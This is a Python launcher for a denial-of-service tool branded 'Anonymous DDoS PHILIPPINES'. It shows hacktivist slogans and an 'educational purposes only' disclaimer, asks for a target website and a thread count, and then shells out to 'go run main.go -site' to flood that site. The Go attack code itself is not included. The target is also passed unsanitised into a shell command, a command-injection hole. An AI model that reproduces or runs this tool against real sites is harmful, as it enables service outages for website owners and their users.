from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
print(Fore.GREEN)
if str(platform.system()) == 'Linux':
    os.system('figlet            Anonymous   DDoS Attack')
else:
    os.system('              pyfiglet Anonymous   DDoS Attack')

print(Fore.YELLOW + Style.BRIGHT +'                  Anonymous DDoS PHILIPPINES')
print(Fore.YELLOW + Style.BRIGHT +'                       Created by Mamaw')
print("")
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                       We are Anonymous')
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                       We are a Legion')
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                       We do not Forgive')  
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                       We do not Forget')
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                          Expect Us!')
print("")
print("")
print(Fore.RED + Style.BRIGHT +                       'THIS IS VERY POWERFULL DDOSING')
print(Fore.RED + Style.BRIGHT +                   'THIS IS FOR EDUCATIONAL PURPOSES ONLY')
print("")
print(Fore.BLUE + Style.BRIGHT +                         'You can use this tools')
print(Fore.BLUE + Style.BRIGHT +                  'but we are not responsible Any Damage')
print('Your OS:'+ Fore.YELLOW + str(platform.system())+Fore.GREEN)
print("")
try:
    threads = input('[+] ENTER THE NUMBER OF' + Fore.RED + ' THREADS ' + Fore.GREEN + '==> ')
    site = input(Fore.BLUE + '[+] Enter the Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '==> ')
    colab_status = input(Fore.YELLOW + 'Are you want to DDoS [Y/N] ')
    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' 1 ATTACKER'+Fore.RED+' Target'+Fore.GREEN+' 2 ATTACKER' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' ==> ')
    if 'Y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As You are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As you are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))

    print('[+] Executing Command as Follows')
    print(Fore.GREEN +'ANONYMOUS={0} go run main.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run main.go -site {0}'.format(site))
    else:
        os.system('ANONYMOUS={0} go run main.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
    print('[+] Installing Dependancies')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')

